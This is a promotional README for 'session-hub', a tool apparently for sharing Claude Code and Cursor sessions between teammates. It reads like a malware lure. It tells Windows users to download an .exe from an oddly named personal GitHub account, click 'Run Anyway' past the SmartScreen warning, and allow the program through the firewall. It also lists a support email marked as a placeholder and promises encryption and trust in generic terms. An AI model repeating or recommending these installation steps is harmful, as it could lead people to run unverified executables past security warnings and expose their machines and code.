# 🔗 session-hub - See, Sync & Supercharge Your AI Sessions

## 🚀 What Is session-hub?

Think of session-hub as a shared window into your team's AI coding work. If you and your teammates use **Claude Code** or **Cursor**, session-hub lets you see what everyone else is working on in real time, send quick messages to each other, and even let your AI assistants talk to each other automatically. No servers, no cloud, no accounts — just a direct, private connection between your computers. Every session is also backed up continuously, so you never lose work.

**In simple words:** If you're a team of developers using AI coding tools, session-hub is your team's virtual meeting room where you can peek at each other's screens, chat, and keep a safety copy of everything.

---

## 🛡️ Why You Can Trust It

- **Peer-to-Peer (P2P):** Your data goes directly from your computer to your teammate's computer. There is no middleman server.
- **End-to-End Encrypted:** Even if someone intercepts your data, they cannot read it. Only you and your teammates have the keys.
- **No Server to Set Up:** Forget complex cloud configurations. Just install, connect, and go.
- **Open Source:** The code is available for anyone to inspect, ensuring there are no hidden tricks.

---

## ✨ Key Features

| Feature | What It Does For You |
|----------|----------------------|
| 👀 **Live Session View** | See what your teammates are doing in Claude Code or Cursor as it happens. |
| 💬 **Teammate Messaging** | Send a quick note or question to a coworker without leaving your editor. |
| 🤖 **AI-to-AI Talk** | Let your AI assistants collaborate automatically on shared problems. |
| 💾 **Automatic Backup** | Every session is continuously saved to your local machine, so you can recover anytime. |
| 🔐 **Private & Secure** | End-to-end encryption plus a direct P2P connection means nobody else can see your work. |
| 🧩 **Built-In MCP Server** | Works with the Model Context Protocol so your AI tools can use session-hub's features seamlessly. |
| 📦 **VS Code & Cursor Extension** | Installs directly into your existing editor. No separate app to juggle. |

---

## 🖥️ System Requirements (Typical)

- **Operating System:** Windows 10 or 11 (64-bit)
- **Editors Supported:** VS Code (version 1.85 or newer) or Cursor (latest version)
- **AI Tools Installed:** Claude Code CLI or Cursor's AI features enabled
- **Internet:** A stable connection for P2P networking (even on a local network)
- **Disk Space:** 200 MB free for the extension and backup storage

---

## 📥 How to Get Started (Windows)

### Step 1: Download session-hub

Visit this link to download the application: **[https://github.com/Laurenaislamic1659/session-hub/releases](https://github.com/Laurenaislamic1659/session-hub/releases)**

You will see a list of files. Look for the one named `session-hub-windows.exe` (this is the installer for Windows). Click on it to start the download. The download size is about 80 MB.

---

### Step 2: Run the Installer

Once the download is complete, go to your **Downloads** folder and double-click on the `session-hub-windows.exe` file. A Windows SmartScreen prompt may appear asking for permission — click **"Yes"** or **"Run Anyway"**.

Follow the simple on-screen instructions:
1. Choose your preferred language.
2. Accept the license agreement.
3. Select the destination folder (the default is fine).
4. Click **"Install"**.

The installation will take about 30 seconds. When it finishes, click **"Finish"**.

---

### Step 3: Launch and Connect

After installation, session-hub will open automatically. You will see a small icon in your system tray (bottom-right corner of your screen, near the clock).

- Click the tray icon to open the main window.
- You will see a screen asking for a **"Team Room Name"** — this is like a shared chat room for your team. Create one, e.g., `my-team-room`.
- Share this room name with your teammates. They will enter the same name on their computers.
- That's it! You are now connected.

---

### Step 4: Install the Editor Extension

session-hub also adds buttons to your VS Code or Cursor:

1. Open **VS Code** or **Cursor**.
2. Click the **Extensions** icon on the left sidebar (it looks like four small squares).
3. Type `session-hub` in the search bar.
4. Click **"Install"** on the extension by session-hub.
5. Restart your editor when prompted.

Now, when you open a project, you'll see a new panel at the bottom called **"Session Hub"**. This shows:
- Who is online
- What files they are editing
- A message box to chat with them
- A button to invite your AI agent to talk to their AI agent

---

## 🧭 Using session-hub Daily

### 💬 Sending a Message

In the Session Hub panel, click on a teammate's name. Type your message in the chat box and press Enter. They will see it instantly if they are online. If they are offline, the message will be delivered when they reconnect.

### 👀 Watching a Live Session

Click on the **eye icon** next to a teammate's name to see a live read-only view of their terminal (Claude Code) or their cursor activity. This is great for pair programming or quick demos. You can close the view anytime by clicking the X.

### 🤖 Letting AIs Talk

If you want your AI to ask your teammate's AI a question:
1. Click on the **robot icon** in the Session Hub panel.
2. Type your question, e.g., "What tests are you running?"
3. Click **"Send to their AI"**. Their AI will receive the message and respond automatically (if they have auto-respond enabled).

### 💾 Restoring from Backup

Everything is saved locally on each computer. If you accidentally delete a file, you can recover it:
1. Open the **Session Hub** panel.
2. Click the **backup** icon (clock with a circle arrow).
3. Browse through previous session snapshots and select one to restore.

---

## ❓ Frequently Asked Questions

### Is my internet speed affected?
No. session-hub only uses a small fraction of your bandwidth — just enough to transmit text and file changes. Video or voice are not involved.

### Can I use it with teammates on macOS or Linux?
Yes! session-hub works on Windows, macOS, and Linux. The download page has separate files for each system. The instructions are the same, only the file name differs (e.g., `session-hub-macos.dmg` or `session-hub-linux.deb`).

### What if I have a firewall?
During the first run, Windows may ask if you want to allow session-hub through the firewall. Click **"Allow access"**. This is necessary so your teammates can connect to you.

### Is there a limit to the number of team members?
No. There is no set limit, but for the best experience, we recommend teams of 2 to 15 people. More than that is fine, but the live session views may become crowded.

### How do I uninstall?
Go to **Settings** → **Apps** → **Installed Apps** → find **session-hub** → click **Uninstall**. In VS Code/Cursor, uninstall the extension via the Extensions panel.

---

## 🤝 Getting Help & Community

- 🐛 **Bug Reports:** Found an issue? Create a report on the [GitHub Issues page](https://github.com/Laurenaislamic1659/session-hub/issues).
- 💬 **Community Forum:** Join our [Discussions page](https://github.com/Laurenaislamic1659/session-hub/discussions) to chat with other users and share tips.
- 📧 **Email Support:** Contact `support@session-hub.io` (placeholder) for direct help. We usually reply within 2 business days.

---

## 📄 License & Legal

session-hub is released under the **AGPL (Affero General Public License)**. This means you are free to use, modify, and share it, provided you keep the same license for your modifications. It is free for personal and commercial use.

---

## 🧰 Contribute to the Project

session-hub is an open-source project. If you are a developer, you can help by:
- Reporting bugs
- Suggesting new features
- Submitting code improvements via pull requests

Every contribution is welcome and appreciated.

---

## 📊 Quick Start Summary

| Action | Where to Go |
|--------|-------------|
| **Download** | [https://github.com/Laurenaislamic1659/session-hub/releases](https://github.com/Laurenaislamic1659/session-hub/releases) |
| **Install** | Run the downloaded `.exe` file |
| **Set Up Team** | Open session-hub, create a room name, share it |
| **Add to Editor** | Install the extension in VS Code/Cursor |
| **Start Collaborating** | Use the Session Hub panel in your editor |

---

## 👋 Final Words

session-hub turns your AI coding sessions from a solo activity into a shared, private, and safe team experience. With zero server complexity and top-tier encryption, it is the easiest way to keep everyone in sync — whether your teammates are in the same office or on the other side of the world.

**Download today and give your team a window into your AI workflows!**

*Keywords: agpl, ai, ai-agents, backup, claude, claude-code, collaboration, cursor, cursor-extension, developer-tools, end-to-end-encryption, hyperswarm, mcp, mcp-server, model-context-protocol, open-vsx, p2p, vscode-extension*